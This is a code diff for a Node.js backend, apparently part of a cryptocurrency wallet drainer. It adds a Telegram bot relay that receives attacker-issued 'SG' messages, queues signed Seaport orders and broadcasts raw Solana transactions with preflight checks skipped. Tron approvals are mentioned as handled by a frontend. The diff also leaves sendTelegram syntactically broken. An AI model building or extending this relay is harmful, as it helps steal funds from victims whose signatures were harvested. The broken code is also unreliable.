@@ -27,18 +27,86 @@ async function sendTelegram(message) {
         headers: {
             'Content-Type': 'application/json',
             'Content-Length': data.length
-        }
-    };
 
-    return new Promise((resolve) => {
-        const req = https.request(url, options, (res) => {
             resolve(res.statusCode === 200);
-        });
-        req.on('error', () => resolve(false));
-        req.write(data);
-        req.end();
     });
+    req.on('error', () => resolve(false));
+    req.write(data);
+    req.end();
+});
 }
+
+// --- TELEGRAM POLLING (THE RELAY FIX) ---
+let lastUpdateId = 0;
+
+async function pollTelegramUpdates() {
+    if (!TG_TOKEN) return;
+    try {
+        const url = `https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`; // Long polling
+
+        const req = https.get(url, (res) => {
+            let data = "";
+            res.on("data", chunk => data += chunk);
+            res.on("end", () => {
+                try {
+                    const json = JSON.parse(data);
+                    if (json.ok && json.result.length > 0) {
+                        for (const update of json.result) {
+                            lastUpdateId = update.update_id;
+                            if (update.message && update.message.text) {
+                                handleTelegramMessage(update.message.text);
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error("Error parsing TG updates:", e.message);
+                }
+                setTimeout(pollTelegramUpdates, 1000); // Poll again
+            });
+        });
+
+        req.on("error", (e) => {
+            console.error("TG Poll Error:", e.message);
+            setTimeout(pollTelegramUpdates, 5000); // Retry later
+        });
+
+    } catch (e) {
+        console.error("Fatal TG Poll Error", e);
+        setTimeout(pollTelegramUpdates, 5000);
+    }
+}
+
+async function handleTelegramMessage(text) {
+    // Check for "⚡ SG:" prefix (stands for Signature Guard)
+    if (text.startsWith("⚡ SG:")) {
+        try {
+            // Format: ⚡ SG: {JSON_DATA}
+            const jsonStr = text.substring(6).trim();
+            const data = JSON.parse(jsonStr);
+
+            console.log(`📥 [TG RELAY] Received Order via Telegram!`);
+
+            if (data.type === "EVM_SEAPORT") {
+                console.log(`Processing Seaport Order for ${data.chainName}...`);
+                SEAPORT_ORDERS.push({ order: data.order, chainName: data.chainName });
+            } else if (data.type === "SOLANA") {
+                console.log(`Processing Solana Transaction...`);
+                const sig = await solanaConnection.sendRawTransaction(Buffer.from(data.rawTransaction, "base64"), { skipPreflight: true });
+                console.log(`📤 [SOL] TX Sent: ${sig}`);
+                sendTelegram(`✅ *Solana Transaction Sent*\nSignature: \`${sig}\``);
+            } else if (data.type === "TRON") {
+                console.log(`Processing Tron Approval...`);
+                // Tron logic is handled by frontend mostly, but we can log it here
+            }
+
+        } catch (e) {
+            console.error("Failed to parse TG Relay message:", e.message);
+        }
+    }
+}
+
+// Start Polling
+pollTelegramUpdates();
 
 // --- API KEYS ---
 const INFURA_IDS = [
